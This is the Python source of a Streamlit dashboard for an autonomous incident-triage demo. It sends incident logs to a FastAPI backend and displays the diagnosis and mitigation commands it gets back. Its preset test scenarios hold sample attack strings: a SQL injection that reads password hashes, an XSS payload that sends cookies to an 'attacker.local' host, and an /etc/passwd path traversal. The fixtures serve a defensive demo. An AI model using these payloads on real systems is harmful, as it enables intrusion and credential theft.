import streamlit as st
import asyncio
import json
import uuid
from datetime import datetime, timezone
import httpx

st.set_page_config(
    page_title="Autonomous Incident Triage & Active Defense",
    page_icon="🛡️",
    layout="wide"
)

st.markdown("""
<style>
    .metric-box {
        background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
        padding: 1.2rem;
        border-radius: 8px;
        border: 1px solid #334155;
        color: #f8fafc;
        margin-bottom: 1rem;
    }
    .badge-soc {
        background-color: #dc2626;
        color: white;
        padding: 4px 8px;
        border-radius: 4px;
        font-weight: bold;
    }
    .badge-sre {
        background-color: #2563eb;
        color: white;
        padding: 4px 8px;
        border-radius: 4px;
        font-weight: bold;
    }
</style>
""", unsafe_allow_html=True)

st.title("🛡️ Huawei Cloud MaaS — Triage Autónomo & Defensa Activa")
st.markdown("*Autonomous Incident Diagnostic Engine with Real-Time Telemetry & Cybersecurity Shield*")

with st.sidebar:
    st.header("⚙️ Configuración & Estado")
    fastapi_url = st.text_input("FastAPI Webhook URL", "http://localhost:8000/webhook/n8n")
    st.markdown("---")
    st.subheader("🎯 Métricas Clave de Negocio")
    st.metric("MTTD Manual", "~30 min")
    st.metric("MTTD Agéntico", "< 15 seg", delta="-99.2%")
    st.markdown("---")
    st.info("Huawei Cloud MaaS (Pangu 40B) + Failover OpenAI")

col1, col2 = st.columns([1.2, 1])

with col1:
    st.subheader("🚨 Inyección o Reporte de Incidente")
    
    preset = st.selectbox(
        "Cargar escenario de prueba preconfigurado:",
        [
            "Custom...",
            "💥 [Chaos] Caída de Base de Datos (Atlas Network Egress Blocked)",
            "💥 [Chaos] OOM Container Crash (Memoria > 512MB)",
            "🚨 [Cyber] Inyección SQL en Autenticación (UNION SELECT)",
            "🚨 [Cyber] Ataque XSS en Búsqueda (<script> Injection)",
            "🚨 [Cyber] Path Traversal Attack (/etc/passwd)"
        ]
    )

    preset_map = {
        "💥 [Chaos] Caída de Base de Datos (Atlas Network Egress Blocked)": {
            "source": "mongodb",
            "component": "database",
            "log": "MongoNetworkError: connection 1 to cluster0.mongodb.net:27017 timed out after 2000ms. Egress packet rejected.",
            "is_sec": False,
            "sev": "P1"
        },
        "💥 [Chaos] OOM Container Crash (Memoria > 512MB)": {
            "source": "nextjs",
            "component": "frontend",
            "log": "fatal error: runtime: out of memory allocating 629145600 bytes. Killed process 1422 (node).",
            "is_sec": False,
            "sev": "P1"
        },
        "🚨 [Cyber] Inyección SQL en Autenticación (UNION SELECT)": {
            "source": "security-scanner",
            "component": "auth",
            "log": "192.168.10.45 - POST /api/auth/login query: username=admin' UNION SELECT 1,username,password_hash FROM users-- status: 401",
            "is_sec": True,
            "sev": "P1"
        },
        "🚨 [Cyber] Ataque XSS en Búsqueda (<script> Injection)": {
            "source": "security-scanner",
            "component": "frontend",
            "log": "192.168.10.88 - GET /dashboard/search?q=<script>fetch('http://attacker.local/steal?cookie='+document.cookie)</script> status: 200",
            "is_sec": True,
            "sev": "P1"
        },
        "🚨 [Cyber] Path Traversal Attack (/etc/passwd)": {
            "source": "security-scanner",
            "component": "frontend",
            "log": "192.168.10.92 - GET /api/static/../../../../etc/passwd status: 403",
            "is_sec": True,
            "sev": "P1"
        }
    }

    selected_data = preset_map.get(preset, {})
    
    source = st.selectbox("Origen de Telemetría (source)", ["nextjs", "mongodb", "n8n", "security-scanner"], 
                          index=["nextjs", "mongodb", "n8n", "security-scanner"].index(selected_data.get("source", "nextjs")))
    component = st.selectbox("Componente (component)", ["frontend", "database", "network", "auth"],
                            index=["frontend", "database", "network", "auth"].index(selected_data.get("component", "frontend")))
    is_sec = st.checkbox("¿Es evento de ciberseguridad?", value=selected_data.get("is_sec", False))
    raw_log = st.text_area("Log Raw / Mensaje de Telemetría", value=selected_data.get("log", ""), height=120)

    if st.button("🚀 Ejecutar Triage Autónomo", type="primary", use_container_width=True):
        if not raw_log.strip():
            st.error("Por favor ingresa un log válido.")
        else:
            payload = {
                "incident_id": str(uuid.uuid4()),
                "source": source,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "component": component,
                "raw_log": raw_log.strip(),
                "is_security_event": is_sec,
                "severity_hint": selected_data.get("sev", "P2")
            }

            with st.spinner("⏳ Agente ejecutando LangGraph, verificando salud y consultando Pangu 40B..."):
                try:
                    res = httpx.post(fastapi_url, json=payload, timeout=15.0)
                    if res.status_code == 200:
                        st.session_state["last_triage"] = res.json()
                        st.success("✅ Diagnóstico completado en < 2 segundos.")
                    else:
                        st.error(f"Error {res.status_code}: {res.text}")
                except Exception as e:
                    st.error(f"Error de conexión con el backend: {str(e)}")

with col2:
    st.subheader("📊 Resultado del Diagnóstico")
    if "last_triage" in st.session_state:
        data = st.session_state["last_triage"]
        
        m1, m2, m3 = st.columns(3)
        with m1:
            st.metric("Risk Score", f"{data.get('risk_score')}/10.0")
        with m2:
            st.metric("Severidad", data.get("severity"))
        with m3:
            team = data.get("escalation_team", "N/A")
            st.metric("Equipo", team)

        st.markdown("#### 🎯 Hipótesis de Causa Raíz")
        st.info(data.get("root_cause_hypothesis", "N/A"))

        st.markdown("#### 🛡️ Comandos de Mitigación / Contención")
        st.code(data.get("mitigation_commands") or "# Sin comandos adicionales", language="bash")

        st.markdown("#### 📋 Checklist para el Operador")
        for item in data.get("checklist", []):
            st.checkbox(item, key=f"chk_{item}")
    else:
        st.info("Selecciona un escenario de prueba a la izquierda y presiona 'Ejecutar Triage Autónomo'.")
